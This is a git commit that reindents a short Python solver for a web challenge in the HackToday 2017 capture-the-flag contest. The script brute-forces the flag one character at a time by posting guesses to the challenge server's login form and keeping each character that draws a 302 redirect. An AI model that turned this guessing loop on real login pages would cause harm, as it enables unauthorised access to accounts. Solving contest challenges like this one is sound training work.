c66826b8e0bbf845e5218023f1c6ceffeb0d465d
Muhammad Thomas Fadhila Yahya <mthomasfadhilayahya@gmail.com>
2017-08-15 16:36:36 +0700

    Update web_time_solver.py

--- hack_today_2017/web/web_time_solver.py
+++ hack_today_2017/web/web_time_solver.py
@@ -5,10 +5,10 @@ password = "HackToday{"
 url = "http://sawah.ittoday.web.id:40137/"
 
 while(password[-1]!="}"):
-  for i in charset:
-    r = requests.get(url)
-    payload = {'password': password+i, 'submit': 'Submit+Query'}
-    r = requests.post(url, data=payload)
-    if r.status_code==302:
-      password+=i
-      print password
+    for i in charset:
+        r = requests.get(url)
+        payload = {'password': password+i, 'submit': 'Submit+Query'}
+        r = requests.post(url, data=payload)
+        if r.status_code==302:
+            password+=i
+            print password
